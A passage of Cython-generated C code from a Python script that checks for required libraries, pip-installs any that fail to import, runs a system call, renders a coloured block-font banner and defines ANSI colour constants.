  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ss66); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 65, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_6 = 0;
    __pyx_t_7 = NULL;
  } else {
    __pyx_t_6 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 65, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_7 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 65, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_7)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_1); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 65, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 65, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_1); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 65, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 65, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_7(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 65, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_library, __pyx_t_1) < 0) __PYX_ERR(0, 65, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
      __Pyx_XGOTREF(__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_10);
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_importlib); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 67, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_import_module); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 67, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_library); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 67, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_12 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_1 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_12, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_4);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 67, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = PyTuple_New(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_13 = 0;
        __pyx_t_14 = 127;
        __Pyx_INCREF(__pyx_kp_u__81);
        __pyx_t_13 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__81);
        PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__81);
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_B6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_14;
        __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u__82);
        __pyx_t_13 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__82);
        PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__82);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_library); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_14;
        __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
        __Pyx_GIVEREF(__pyx_t_11);
        PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_11);
        __pyx_t_11 = 0;
        __Pyx_INCREF(__pyx_kp_u__83);
        __pyx_t_13 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__83);
        PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__83);
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_G6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_14;
        __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_P_A_Is);
        __pyx_t_14 = (65535 > __pyx_t_14) ? 65535 : __pyx_t_14;
        __pyx_t_13 += 24;
        __Pyx_GIVEREF(__pyx_kp_u_P_A_Is);
        PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u_P_A_Is);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 7, __pyx_t_13, __pyx_t_14); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L7_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
      }
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      goto __pyx_L14_try_end;
      __pyx_L7_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_15 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ImportError);
      if (__pyx_t_15) {
        __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_4, &__pyx_t_11) < 0) __PYX_ERR(0, 69, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GOTREF(__pyx_t_11);

        
        __pyx_t_12 = PyTuple_New(7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_13 = 0;
        __pyx_t_14 = 127;
        __Pyx_INCREF(__pyx_kp_u__81);
        __pyx_t_13 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__81);
        PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_kp_u__81);
        __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_B6); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_14;
        __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
        __Pyx_GIVEREF(__pyx_t_17);
        PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_t_17);
        __pyx_t_17 = 0;
        __Pyx_INCREF(__pyx_kp_u__82);
        __pyx_t_13 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__82);
        PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_kp_u__82);
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_library); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_14;
        __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
        __Pyx_GIVEREF(__pyx_t_16);
        PyTuple_SET_ITEM(__pyx_t_12, 3, __pyx_t_16);
        __pyx_t_16 = 0;
        __Pyx_INCREF(__pyx_kp_u__83);
        __pyx_t_13 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__83);
        PyTuple_SET_ITEM(__pyx_t_12, 4, __pyx_kp_u__83);
        __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_red6); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_14;
        __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
        __Pyx_GIVEREF(__pyx_t_17);
        PyTuple_SET_ITEM(__pyx_t_12, 5, __pyx_t_17);
        __pyx_t_17 = 0;
        __Pyx_INCREF(__pyx_kp_u_P_Is_N_Is_S_Ps_W);
        __pyx_t_14 = (65535 > __pyx_t_14) ? 65535 : __pyx_t_14;
        __pyx_t_13 += 41;
        __Pyx_GIVEREF(__pyx_kp_u_P_Is_N_Is_S_Ps_W);
        PyTuple_SET_ITEM(__pyx_t_12, 6, __pyx_kp_u_P_Is_N_Is_S_Ps_W);
        __pyx_t_17 = __Pyx_PyUnicode_Join(__pyx_t_12, 7, __pyx_t_13, __pyx_t_14); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 71, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        
        __pyx_t_12 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_17); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 70, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_sn73); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_check_call); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_os); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_sys); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_executable); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_library); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_19 = PyList_New(5); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_19);
        __Pyx_GIVEREF(__pyx_t_17);
        PyList_SET_ITEM(__pyx_t_19, 0, __pyx_t_17);
        __Pyx_INCREF(__pyx_kp_u_m);
        __Pyx_GIVEREF(__pyx_kp_u_m);
        PyList_SET_ITEM(__pyx_t_19, 1, __pyx_kp_u_m);
        __Pyx_INCREF(__pyx_n_u_pip);
        __Pyx_GIVEREF(__pyx_n_u_pip);
        PyList_SET_ITEM(__pyx_t_19, 2, __pyx_n_u_pip);
        __Pyx_INCREF(__pyx_n_u_install);
        __Pyx_GIVEREF(__pyx_n_u_install);
        PyList_SET_ITEM(__pyx_t_19, 3, __pyx_n_u_install);
        __Pyx_GIVEREF(__pyx_t_18);
        PyList_SET_ITEM(__pyx_t_19, 4, __pyx_t_18);
        __pyx_t_17 = 0;
        __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
          }
        }
        __pyx_t_12 = (__pyx_t_18) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_18, __pyx_t_19) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_19);
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 72, __pyx_L9_except_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        goto __pyx_L8_exception_handled;
      }
      goto __pyx_L9_except_error;
      __pyx_L9_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
      goto __pyx_L1_error;
      __pyx_L8_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
      __pyx_L14_try_end:;
    }

    
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_6 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u__84);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__84);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u__84);
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_Z); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_11, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_14;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_A_P_Is_Sss);
  __pyx_t_14 = (65535 > __pyx_t_14) ? 65535 : __pyx_t_14;
  __pyx_t_6 += 40;
  __Pyx_GIVEREF(__pyx_kp_u_A_P_Is_Sss);
  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_A_P_Is_Sss);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_6, __pyx_t_14); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__85, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_render); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 78, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_4 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_font, __pyx_n_u_block) < 0) __PYX_ERR(0, 80, __pyx_L1_error)

  
  __pyx_t_11 = PyList_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 81, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_INCREF(__pyx_n_u_yellow);
  __Pyx_GIVEREF(__pyx_n_u_yellow);
  PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_u_yellow);
  __Pyx_INCREF(__pyx_n_u_cyan);
  __Pyx_GIVEREF(__pyx_n_u_cyan);
  PyList_SET_ITEM(__pyx_t_11, 1, __pyx_n_u_cyan);
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_colors, __pyx_t_11) < 0) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_align, __pyx_n_u_center) < 0) __PYX_ERR(0, 80, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_space, Py_True) < 0) __PYX_ERR(0, 80, __pyx_L1_error)

  
  __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__86, __pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 78, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_logo, __pyx_t_11) < 0) __PYX_ERR(0, 78, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B6, __pyx_kp_u_1_96m) < 0) __PYX_ERR(0, 86, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_30m) < 0) __PYX_ERR(0, 87, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y6, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 88, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G6, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 89, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red6, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 90, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_P6, __pyx_kp_u_1_95m) < 0) __PYX_ERR(0, 91, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_DP6, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 92, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_W6, __pyx_kp_u_2_39m) < 0) __PYX_ERR(0, 93, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_DY6, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 94, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_O6, __pyx_kp_u_38_5_202m) < 0) __PYX_ERR(0, 95, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_L6, __pyx_kp_u_38_5_203m) < 0) __PYX_ERR(0, 96, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_choice); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_B6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Z); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_G6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_red6); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_W6); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_16);
  __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_O6); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_19);
  __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_L6); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __pyx_t_17 = PyList_New(7); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __Pyx_GIVEREF(__pyx_t_4);
  PyList_SET_ITEM(__pyx_t_17, 0, __pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_2);
  PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_1);
  PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_12);
